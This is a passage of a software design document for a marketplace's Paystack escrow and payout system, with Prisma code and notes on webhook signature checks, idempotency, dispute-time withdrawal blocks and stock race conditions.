      data:  {
        availableBalance: { increment: order.sellerAmount },
        totalEarned:      { increment: order.sellerAmount },
      }
    })
    await tx.walletTransaction.create({ data: {
      walletId:    (await tx.wallet.findFirst({ where: { userId: order.store.ownerId } }))!.id,
      amount:      order.sellerAmount,
      description: `Sale: Order #${order.id.slice(-8)}`,
      orderId,
    }})
    await tx.order.update({
      where: { id: orderId },
      data:  { status: 'COMPLETED', completedAt: new Date() }
    })
    return order
  })

  // Post-release: prompt buyer to leave a review
  await emailQueue.add('buyer-leave-review', { orderId, delay: 3600000 })  // 1 hour delay
  logger.info({ orderId, trigger, actorId }, 'Escrow released — seller wallet credited')
}
Pillar 2

Performance & Optimization

  • The webhook endpoint must respond within 20 seconds. Paystack retries after 20 seconds without a response. To guarantee this: (1) verify the HMAC signature (<1ms), (2) save the raw event to webhook_events (<5ms typically), (3) send the 200 response immediately, (4) process the event asynchronously after the response has been sent. Never make the financial processing block the HTTP response.
  • Escrow auto-release cron is idempotent by design. The auto-release job runs every minute and calls releaseEscrow() for all orders where escrowReleaseAt <= NOW() AND status = 'PAYMENT_RECEIVED'. The R-03 atomic WHERE guard (WHERE status = 'HELD') means even if the cron fires twice within the same minute due to a scheduling bug, only one release succeeds. The second is silently ignored via the ALREADY_RELEASED error path.
  • Paystack Transfer API is called outside the database transaction. Initiating a Paystack payout transfer is an external API call — you cannot roll it back with a Prisma transaction. Always: (1) debit the wallet inside a DB transaction, (2) call Paystack Transfer AFTER the transaction commits, (3) if the Transfer call fails, immediately re-credit the wallet and mark the Payout FAILED. Never call Paystack inside a Prisma $transaction() block.
  • Checkout page uses client-side redirect, not server redirect. After initiating the order, Express returns the Paystack authorization_url. The frontend does window.location.href = authorizationUrl. A server-side redirect() would lose the order ID from the Next.js context. Using client-side navigation preserves the ability to show a loading state and handle errors.
Pillar 3

Security & Error Handling

Webhook HMAC Verification — The First Line of Defense

Without signature verification, anyone who knows your webhook URL can POST fake payment success events and trigger fake escrow releases. The verification code is: crypto.createHmac('sha512', PAYSTACK_SECRET_KEY).update(rawBody).digest('hex') and compare to the x-paystack-signature header. This MUST run before any business logic. If signatures don't match, return 401 immediately and log a WARN — this is a potential attack. The webhook route MUST use express.raw() — once express.json() parses the body, the raw bytes are gone and HMAC verification will always fail.

  • R-11 — Block seller withdrawals during open disputes. Before initiating a payout, check prisma.dispute.count({ where: { order: { storeId: store.id }, status: { in: ['OPEN', 'UNDER_REVIEW'] } } }). If count > 0, reject the payout with "You cannot withdraw while a dispute is open for one of your orders." This prevents the fraud scenario where a seller receives a legitimate chargeback request, withdraws all their wallet balance, and has no funds to cover a valid refund.
  • R-13 — Platform fee is never refunded. When a full refund is issued (on admin decision or buyer dispute win), the refund amount is escrow.heldAmount — the seller's cut only. The platformFee portion stays with the platform. This must be enforced in the refund service, never computed on the fly. The order record has both values — always use the pre-computed sellerAmount for refund calculation.
  • Paystack amount in pesewas — type safety. Paystack accepts amounts in the smallest denomination (pesewas for GHS). Your toPesewas() function must use Decimal arithmetic: amount.mul(100).toInteger(). Never use Math.round(parseFloat(amount) * 100) — floating-point rounding errors in pesewa conversion will cause Paystack to reject transactions or, worse, charge slightly wrong amounts that compound over thousands of transactions.
  • Payout to wrong recipient code. Before calling the Transfer API, verify that the paystackRecipientCode on the user record is still valid by calling Paystack's GET /transferrecipient/{recipient_code} endpoint. A deleted or disabled recipient code will cause the transfer to fail silently (no webhook, no error response). This verification adds one API call but prevents stranded payouts.

Pillar 5

Edge Cases & Missed Scenarios

Two buyers purchase the last unit simultaneously

Item has stock = 1. Buyer A and Buyer B both initiate checkout at the exact same millisecond. Both see stock = 1 available. Both create orders. Both redirect to Paystack. Both pay. Now you have two completed payments for one item.
The prisma.listing.update({ where: { id, stock: { gte: quantity } }, data: { stock: { decrement: quantity } } }) in the Prisma transaction is the race condition guard. PostgreSQL's row-level locking ensures only one transaction can acquire the row lock at a time. The second transaction's UPDATE matches 0 rows (stock is already 0), the Prisma transaction throws, the order is NOT created, and the second buyer never gets a Paystack URL. They see: "Sorry, this item just sold out."

Network drop after Paystack redirect, before buyer pays

Buyer clicks "Buy", order is created (status: PENDING_PAYMENT), stock is decremented. Browser redirects to Paystack. Buyer's internet dies. They never pay. The order sits in PENDING_PAYMENT forever, and the stock is locked.
The reconciliation cron (runs every 5 minutes) finds orders in PENDING_PAYMENT for > 10 minutes. It calls Paystack's GET /transaction/verify/{reference}. If status is abandoned, it cancels the order, re-increments the stock (listing.stock: { increment: quantity }), and notifies the buyer that their session expired. Include a Paystack reference expiry concept — transactions older than 60 minutes with no payment are treated as abandoned.

Seller changes payout method mid-payout

A seller updates their MTN MoMo number (creating a new Paystack recipient) while a payout is in the PENDING state using the old recipient code. The old recipient code may be deleted.
The Payout record stores a snapshot of the recipientCode and recipientDetails at the time the payout was initiated. A seller updating their payout method creates a new Paystack recipient but does NOT invalidate in-flight payouts using the old one. The new recipient is only used for future payout requests. Paystack recipient deletion is blocked (via the Paystack dashboard settings) while a payout using it is PENDING.

Paystack webhook fires twice for the same charge

Your server responds slowly (>5s) to the first webhook delivery. Paystack retries, sending the same charge.success event again. Without protection, you'd create two Escrow records and credit the seller's wallet twice.
The idempotency check: if (order.status !== 'PENDING_PAYMENT') return in handleChargeSuccess. The first webhook sets status to PAYMENT_RECEIVED. The second webhook finds status !== 'PENDING_PAYMENT' and returns early — no double processing. This guard must precede all DB writes. Additionally, the webhook_events table has a unique constraint on externalId — a duplicate event upsert is a no-op.
